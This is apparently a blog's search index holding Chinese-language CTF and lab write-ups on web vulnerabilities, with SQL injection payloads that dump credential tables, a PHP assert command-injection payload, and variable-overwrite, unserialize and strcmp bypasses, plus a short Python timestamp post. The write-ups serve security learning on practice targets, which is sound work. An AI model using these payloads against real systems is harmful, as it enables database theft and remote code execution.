    <title>sqli-lab less1</title>
    <url>/2019/12/16/sqli-lab%20less1/</url>
    <content><![CDATA[<h2 id="sqli-lab-学习记录"><a href="#sqli-lab-学习记录" class="headerlink" title="sqli-lab  学习记录"></a>sqli-lab  学习记录</h2><p>Less 1<br>1，我们先要爆出他的字段数，即列的数目<br>插入知识：<br>information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。<br>感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。<br>数据库拥有一个名为tables的数据表，<br>该表包含两个字段table_name和table_schema,分别记录DBMS中的存储的表名和表名所在的数据库。</p>
<p>’ or 1=1 –+ （–后要加空格才能注释，但是在网址栏输入时最后加空格解析时会被去掉，所以用+，当然用%20也行）<br>’ or 1=1 # （火狐下在url栏用#注释会报错，改成url编码%23即可）<br>我们使用如下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 1 %23</span><br><span class="line">?id&#x3D;1&#39; order by 2 %23</span><br><span class="line">?id&#x3D;1&#39; order by 3 %23</span><br></pre></td></tr></table></figure>
<p>当我们进行到order by 4 %23时，我们发现报错，所以我们判断有三列<br>对了，要判断注入点<br>输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>


<p>会报错<br>显示<br><img src="https://img-blog.csdnimg.cn/20190314203258751.png" alt="在这里插入图片描述">所以差不多我们输入的就放在了这对引号内<br>ok<br>2.之后我们进行爆表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() %23</span><br></pre></td></tr></table></figure>
<p>得到了<br><img src="https://img-blog.csdnimg.cn/20190314203625178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们判断用户名在users中<br>之后爆列喽<br>附加一些资料<br><img src="https://img-blog.csdnimg.cn/20190314204021330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/2019031420403782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; %23</span><br></pre></td></tr></table></figure>
<p>得到：<br><img src="https://img-blog.csdnimg.cn/20190314204850959.png" alt="在这里插入图片描述">之后我们再得到我们需要的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,group_concat(id,username,password),3 from users %23</span><br></pre></td></tr></table></figure>
<p>最后我们就得到了我们想要的：<br><img src="https://img-blog.csdnimg.cn/20190314205154204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">累死了，，，加油吧</p>
]]></content>
  </entry>
  <entry>
    <title>jarvis OJ web babyphp</title>
    <url>/2019/12/16/jarvis%20OJ%20web%20babyphp/</url>
    <content><![CDATA[<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>考完二级后我又要回归web狗了<br>今天做到一道web题<br>上题：<br><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/</a></p>
<p>进入后：<br>发现应该有git泄露<br>因此我们使用githack进行获得源码</p>
<a id="more"></a>
<pre><code>打开cmd
输入：python2 GitHack.py http://web.jarvisoj.com:32798/.git/
#这里的python2是我设置的用于区分python3
即这个脚本要使用python2</code></pre><p>之后我们得到源码：</p>
<p>当然如果我们直接在打开flag.php的话没用的，因为emmm标志被注释掉了<br><img src="https://img-blog.csdnimg.cn/20190402200211913.png" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20190402200311594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们重点来看这里：<br>assert（）函数<br><img src="https://img-blog.csdnimg.cn/20190402200415600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个我也不算太懂，但是只要是这一句话<br>如果assertion是字符串，那么此字符串会被当做php代码执行<br>因此我们就可以进行php注入（我的第一次php注入）<br>我们在url后面输入</p>
<pre><code>?page=&apos;. system(&quot;cat templates/flag.php&quot;).&apos;</code></pre><p>这个代码的意思是打开flag.php 所在的templates文件中的此文件<br>为什么知道他在那里，因为有：<br><img src="https://img-blog.csdnimg.cn/20190402203454570.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190402203521735.png" alt="在这里插入图片描述"></p>
<p>输入payload后我们查看源代码得到flag<br><img src="https://img-blog.csdnimg.cn/20190402203613988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为什么要查看源码才能看到了，因为标志被注释了呀（源代码的那部分是绿色的）</p>
]]></content>
  </entry>
  <entry>
    <title>python将时间戳转化为时间</title>
    <url>/2019/12/16/python%E5%B0%86%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E5%8C%96%E4%B8%BA%E6%97%B6%E9%97%B4/</url>
    <content><![CDATA[<hr>
<p>title:第一篇博客：python时间转换（将时间戳转化为时间）<br>date: 2019-02-014 22:37:58<br>tags:<br>    python的os.path模块中有着这样的一个函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">os.path.getatime()    #获得文件的最近访问时间</span><br><span class="line">os.path.getctime()    #获得文件的创建时间</span><br><span class="line">os.path.getmtime()   #获得文件的修改时间</span><br></pre></td></tr></table></figure>
<p>我们就以第一个函数为例<br>os.path.getatime()<br>1.首先使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.localtime()     #将其转换为localtime的格式</span><br></pre></td></tr></table></figure>
<p>2.将转化过来的时间进行格式化，使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.strftime(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp)    #temp为转化过来的localtime格式时间</span><br></pre></td></tr></table></figure>
<p>3.最后输出就行了<br>完整的过程如下所示：`</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">temp &#x3D; time.localtime(os.path.getatime(&quot;python.exe&quot;))</span><br><span class="line">#获取python.exe的最近访问时间，并将其localtime化</span><br><span class="line">temp1 &#x3D; time.strftime(&quot;(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp)</span><br><span class="line">#将temp格式化</span><br><span class="line">print(temp1)</span><br></pre></td></tr></table></figure>
<p>（这是我第一次写博客，有啥不好的，大佬指教）<br>邮箱：<a href="mailto:497710073@qq.com">497710073@qq.com</a></p>
]]></content>
  </entry>
  <entry>
    <title>issctf     web1</title>
    <url>/2019/12/16/issctf%20%20%20%20%20web1/</url>
    <content><![CDATA[<h2 id="标题issctf-中最简单的一个web题（耗费了我一个小时。。。。）"><a href="#标题issctf-中最简单的一个web题（耗费了我一个小时。。。。）" class="headerlink" title="标题issctf 中最简单的一个web题（耗费了我一个小时。。。。）"></a>标题issctf 中最简单的一个web题（耗费了我一个小时。。。。）</h2><p>题目涉及知识点：<br>1.php 中的几个函数（等会列举）<br>2.php parse_str引起的变量覆盖漏洞</p>
<a id="more"></a>
<p>一、<br>我们要了解的php函数即方法<br>$<em>SERVER[‘REQUEST_URI’]<br>parse_url<br>parse_str<br>二、<br>由parse_str引起的变量覆盖漏洞<br>parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。<br>ok<br>三、<br>接下来打开题目<br>&lt;?php<br>error_reporting(0);<br>include(“flag.php”); $hashed_key = ‘ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a’; $parsed = parse_url($<em>SERVER[‘REQUEST_URI’]);<br>if(isset($parsed[“query”])){<br>    $query = $parsed[“query”];<br>    $parsed_query = parse_str($query);<br>    if($parsed_query!=NULL){<br>        $action = $parsed_query[‘action’];<br>    }<br>    if($action===”auth”){<br>        $key = $_GET[“key”];<br>        $hashed_input = hash(‘sha256’, $key);<br>        if($hashed_input!==$hashed_key){<br>            die(“<img src='cxk.jpg'>“);<br>        }<br>        echo $flag;<br>    }<br>}else{<br>    show_source(__FILE</em></em>);<br>}?&gt;</p>
<p>我们只需构造一个get传入<br>是action=auth<br>且将<br>hashed_key变量进行覆盖，传入你想传入的经过sha256后的值<br>最后传入key即可<br>样本<br>?action=auth&amp;hashed_key=xxxxxxx&amp;key=xxx</p>
]]></content>
  </entry>
  <entry>
    <title>flag.php bugku  web</title>
    <url>/2019/12/16/flag.php%20bugku%20%20web/</url>
    <content><![CDATA[<h2 id="bugku-web-flag-php"><a href="#bugku-web-flag-php" class="headerlink" title="bugku    web        flag.php"></a><strong>bugku    web        flag.php</strong></h2><p>打开题目网页<br>首先尝试了一下简单的sql注入<br>但是没用<br><img src="https://img-blog.csdnimg.cn/20190308190046343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">想了一会后，发现提示hint<br>所以我们尝试一下使用get方法传入hint任意值<br>即?hint=1<br>传入后发现一页代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];</span><br><span class="line">if(isset($_GET[&#39;hint&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>之后我们查看开头的代码<br>发现要将cookie指进行序列化后<br>使与key值相等即可得到flag<br>但是<br>注意：下方的key值并不是我们需要的<br>而我们需要的key值在程序中并没有赋值<br>因此为NULL<br>所以有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$KEY&#x3D;&quot;&quot;;</span><br><span class="line">print(serialize($KEY));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>因为我们并没有对$key进行赋值因此求序列化的程序如上所示<br>之后我们可以使用火狐上的hackbar<br>上传cookies<br>即ISecer=s:0:””%3b<br>因为；无法上传 ， 因此我们使用其的url码上传<br>注意，上传的时候要在没有get  hint的页面中进行<br>否则无法显示flag</p>
<p>萌新  还请大佬指教<br>邮箱：<a href="mailto:497710073@qq.com">497710073@qq.com</a></p>
]]></content>
  </entry>
  <entry>
    <title>extract（）变量漏洞</title>
    <url>/2019/12/16/extract%EF%BC%88%EF%BC%89%E5%8F%98%E9%87%8F%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="php代码审计日志一（bugku-extract变量覆盖）"><a href="#php代码审计日志一（bugku-extract变量覆盖）" class="headerlink" title="php代码审计日志一（bugku  extract变量覆盖）"></a>php代码审计日志一（bugku  extract变量覆盖）</h2><p>题目来源：bugku<br>代码为：<br><img src="https://img-blog.csdnimg.cn/20190309083831775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们先了解一下extract（）函数<br><img src="https://img-blog.csdnimg.cn/20190309083932380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">之后我们再了解一下php中的extract（）漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/2019030908412227.png" alt="在这里插入图片描述"><br>第一次我所构造的为：<br>?shiyan=1&amp;flag=1<br>但是不行<br>我查了一些大佬的wp后发现有：<br><img src="https://img-blog.csdnimg.cn/20190309084444350.png" alt="在这里插入图片描述">之后我们就可以得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>csdn_export_md</title>
    <url>/2019/12/16/csdn_export_md/</url>
    <content><![CDATA[<h2 id="代码审计之strcmp（）漏洞"><a href="#代码审计之strcmp（）漏洞" class="headerlink" title="代码审计之strcmp（）漏洞"></a>代码审计之strcmp（）漏洞</h2><p>先了解一下此漏洞：<br><strong>strcmp(str1,str2)比较两个字符串，如果相等就返回0。</strong></p>
<p>在5.3版本前，如果传入的不是字符串，那么会报错，并且return 0，返回0就代表相等了。<br>绕过strcmp就想办法传入数组吧，只需要v3[]=3即可。</p>
<p>之后我们通过一个题来做一个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&#39;a&#39;])) &#123;</span><br><span class="line">if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">&#x2F;&#x2F;比较两个字符串（区分大小写）</span><br><span class="line">die(&#39;Flag: &#39;.$flag);</span><br><span class="line">else</span><br><span class="line">print &#39;No&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>因此我们可以构造<br>?a[]=1<br>即可得到flag</p>
]]></content>
  </entry>
  <entry>
    <title>bugku成绩单</title>
    <url>/2019/12/16/bugku%E6%88%90%E7%BB%A9%E5%8D%95/</url>
    <content><![CDATA[<h2 id="bugku成绩单-详细解析"><a href="#bugku成绩单-详细解析" class="headerlink" title="bugku成绩单  详细解析"></a>bugku成绩单  详细解析</h2><p>1，我们首先分别输入1,2,3，<br>均有输出<br>我们输入1’<br>没有回响<br>因此我们可以判断存在sql注入<br>2.我们分别输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 1#</span><br><span class="line">1&#39; order by 2#</span><br><span class="line">1&#39; order by 3#</span><br><span class="line">1&#39; order by 4#</span><br></pre></td></tr></table></figure>
<p>均有回响<br>但是当我们使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; order by 5#</span><br></pre></td></tr></table></figure>
<p>时，没有回响<br>因此我们可以根据此判断字段数为4<br>3，<br>之后就是最精彩的地方了<br>之后我们联合查询<br>我们先输入<br>注意（select好像tm的不是查询，，好像是赋值。。）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,3,4#</span><br></pre></td></tr></table></figure>
<p>没有显示有用的东西<br>因为id=1  所以我们的东西被覆盖<br>因此呢<br>我们输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5&#39; union select 1,2,3,database()#</span><br></pre></td></tr></table></figure>
<p>即设置一个新的id，我们要select的值会显示在表上（覆盖）<br><img src="https://img-blog.csdnimg.cn/20190309162426694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>现在我们得到了一个数据库的名字<br>之后就进行爆表<br>5’union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>得到<br><img src="https://img-blog.csdnimg.cn/20190309163625472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">之后再进行获得里面的列<br>‘ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#<br>得到<br><img src="https://img-blog.csdnimg.cn/20190309164001253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们得到了列<br>之后我们获取我们要得到的东西<br>5’ union select 1,2,3,skctf_flag from fl4g#<br><img src="https://img-blog.csdnimg.cn/20190309164216346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">得到flag</p>
<p>之后我会写一些关于sql语句的总结</p>
]]></content>
  </entry>
</search>
